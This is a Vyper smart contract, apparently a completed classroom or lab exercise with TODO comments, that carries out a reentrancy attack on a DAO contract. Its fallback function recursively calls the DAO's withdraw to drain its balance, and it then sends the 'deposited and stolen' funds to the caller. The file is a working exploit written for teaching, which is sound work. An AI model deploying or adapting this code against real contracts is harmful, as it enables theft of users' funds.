interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view

dao_address: public(address)
owner_address: public(address)
counter: uint256
deposit: uint256

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS
    
    # TODO: Use the DAO interface to withdraw funds.
    # Make sure you add a "base case" to end the recursion
    if self.counter != 0:
        DAO(self.dao_address).withdraw()
    return True

@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    self.owner_address = msg.sender
    deposit_amount: uint256 = msg.value
    self.deposit = deposit_amount
    self.counter = dao_address.balance / deposit_amount + 1
 
    # Attack cannot withdraw more than what exists in the DAO
    if dao_address.balance < msg.value:
        deposit_amount = dao_address.balance
        self.counter = 1
    
    # TODO: make the deposit into the DAO
    DAO(dao_address).deposit(value=deposit_amount)
    # TODO: Start the reentrancy attack
    DAO(dao_address).withdraw()
    # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
    send(self.owner_address, self.balance)
    pass

@external
@payable
def __default__():
    # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
    
    # TODO: Add code here to complete the recursive call
    self.counter -=1
    self._attack()

    pass
